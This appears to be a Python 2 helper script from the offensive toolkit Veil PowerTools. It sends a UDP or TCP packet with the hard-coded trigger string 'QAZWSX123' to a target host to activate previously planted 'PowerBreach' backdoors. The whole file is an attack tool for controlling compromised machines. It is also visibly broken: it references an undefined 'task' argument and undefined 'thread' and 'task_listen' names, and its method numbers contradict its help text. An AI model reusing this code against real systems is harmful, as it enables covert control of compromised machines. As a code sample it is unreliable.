
#This is a simple script that allows an operator to send a TCP or UDP packet at a system with a specified DATA portion. It is used in Veil PowerTools to trigger the PowerBreach backdoors that require a network trigger. 
import argparse
import socket
import time

parser = argparse.ArgumentParser(description="Trigger your backdoors")
parser.add_argument("target", help="The target you want to trigger")
parser.add_argument("-m", "--method", type=int, choices=[0,1,2], default=0, help="Select method of trigger: 1(UDP), 2(TCP Bind)")
parser.add_argument("-p", "--port", type=int, default=4444, help="Port number to trigger on") 
parser.set_defaults(noserver=False)
args = parser.parse_args()

targ = args.target
port = args.port
taskfile = args.task
method = args.method

#start up webserver
if not args.noserver:
	thread.start_new_thread(task_listen,())
	time.sleep(2)

if method ==0:
	#Connect via UDP
	print "[*] Sending UDP Trigger to %s on port %s..." % (targ, str(port))
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock.sendto("QAZWSX123", (targ, port))
	print "[*] Trigger Sent"
elif method==1:
	print "[*] Sending TCP Bind Trigger to %s on port %s..." % (targ, str(port))
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((targ,port))
	sock.send("QAZWSX123")
	sock.close()
	print "[*] Trigger Sent"
else:
	print "[!] ERROR... Wrong Method"








